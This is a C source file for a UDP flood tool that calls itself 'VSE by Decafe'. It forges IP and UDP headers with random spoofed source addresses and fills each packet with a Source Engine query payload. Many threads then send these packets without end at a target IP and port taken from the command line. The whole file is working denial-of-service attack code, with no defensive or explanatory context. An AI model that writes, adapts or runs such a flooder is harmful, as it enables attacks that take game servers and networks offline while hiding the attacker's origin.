#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
static unsigned int attport;
char sourceip[17];
void init_rand(uint32_t x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++)
        {
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
        }
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
 
/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
        unsigned long sum;
        for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}
 
void setup_ip_header(struct iphdr *iph)
{
      iph->ihl = 5;
      iph->version = 4;
      iph->tos = 0;
      iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 25;
      iph->id = htonl(54321);
      iph->frag_off = 0;
      iph->ttl = MAXTTL;
      iph->protocol = IPPROTO_UDP;
      iph->check = 0;
      snprintf(sourceip, sizeof(sourceip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
      iph->saddr = inet_addr(sourceip); // Holy fuck this is terrible
}

void setup_udp_header(struct udphdr *udph)
{
      udph->source = htons(5678);
      udph->check = 0;
      memcpy((void *)udph + sizeof(struct udphdr), "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", 25);
      udph->len=htons(sizeof(struct udphdr) + 25);
}
 
void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(td);
	sin.sin_port = attport;
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s < 0){
                fprintf(stderr, "Could not open raw socket.\n");
                exit(-1);
        }
        init_rand(time(NULL));
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_udp_header(udph);
	udph->dest = attport;
        udph->source = htons(rand() % 65535);
        iph->daddr = sin.sin_addr.s_addr;
	iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
                exit(-1);
        }
        int i=0;
        while(1){
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		setup_ip_header(iph);
		setup_udp_header(udph);
		udph->dest = attport;
		udph->source = htons(rand() % 65535);
		iph->daddr = sin.sin_addr.s_addr;
		iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
                if(i==5)
                {
                        usleep(0);
                        i=0;
                }
                i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 4){
                fprintf(stderr, "Invalid parameters!\n");
                fprintf(stderr, "VSE by Decafe!\n");
                fprintf(stdout, "Usage: %s <target IP> <target port> <throttle> <time (optional)>\n", argv[0]);
                exit(-1);
        }
        int i = 0;
        fprintf(stdout, "Setting up Sockets...\n");
        int max_len = 128;
        char *buffer = (char *) malloc(max_len);
        buffer = memset(buffer, 0x00, max_len);
        int num_threads = atoi(argv[3]);
        pthread_t thread[num_threads];
        struct thread_data td[num_threads];
	attport = htons(atoi(argv[2]));
        for(i = 0;i<num_threads;i++){
                pthread_create( &thread[i], NULL, &flood, (void *) argv[1]);
        }
        fprintf(stdout, "Starting Flood...\n");
        fprintf(stdout, "VSE by Decafe...\n");
        if(argc > 5)
        {
                sleep(atoi(argv[4]));
        } else {
                while(1){
                        sleep(1);
                }
        }
        return 0;
}